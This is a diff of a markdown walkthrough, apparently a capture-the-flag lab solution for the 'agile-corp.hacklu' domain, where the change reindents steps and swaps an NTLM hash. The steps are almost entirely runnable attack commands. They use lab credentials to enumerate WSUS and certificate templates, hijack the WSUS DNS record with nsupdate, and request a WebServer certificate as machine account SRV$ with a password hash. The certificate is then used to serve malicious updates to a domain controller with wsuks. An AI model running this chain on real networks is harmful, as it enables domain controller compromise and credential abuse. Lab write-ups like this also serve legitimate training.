@@ -22,13 +22,13 @@
 8. `sudo wsuks -u svc_deploy -p 'D3pl0y!_AgileCorp' -d agile-corp.hacklu --dc-ip 192.168.109.10 --only-discover`
 9. `nxc ldap 192.168.109.10 -u svc_deploy -p 'D3pl0y!_AgileCorp' -M certipy-find`
 10. Update WSUS DNS entry (first update hosts file): `nsupdate`
-   1. `nsupdate`
-   2. `server agile-corp.hacklu`
-   3. `zone agile-corp.hacklu`
-   4. `update add wsus.agile-corp.hacklu. 86400 A 192.168.109.137`
-   5. `update delete wsus.agile-corp.hacklu. A 192.168.108.10`
-   6. `send`
-11. `certipy req -dc-ip 192.168.109.10 -u SRV$ -hashes c05529a83e9df1e168d860edcb7cfa79 -template WebServer -target DC.agile-corp.hacklu -ca agile-corp-Root-CA -dns wsus.agile-corp.hacklu`
+    1.  `nsupdate`
+    2.  `server agile-corp.hacklu`
+    3.  `zone agile-corp.hacklu`
+    4.  `update add wsus.agile-corp.hacklu. 86400 A 192.168.109.137`
+    5.  `update delete wsus.agile-corp.hacklu. A 192.168.108.10`
+    6.  `send`
+11. `certipy req -dc-ip 192.168.109.10 -u SRV$ -hashes 7e4f65f8776fabe11d9e72deb0401a6e -template WebServer -target DC.agile-corp.hacklu -ca agile-corp-Root-CA -dns wsus.agile-corp.hacklu`
 12. `openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:`
 13. `sudo wsuks --WSUS-Server wsus.agile-corp.hacklu --tls-cert wsus.pem --serve-only`
 14. Wait up to 1 minute for WSUS updates on the DC.
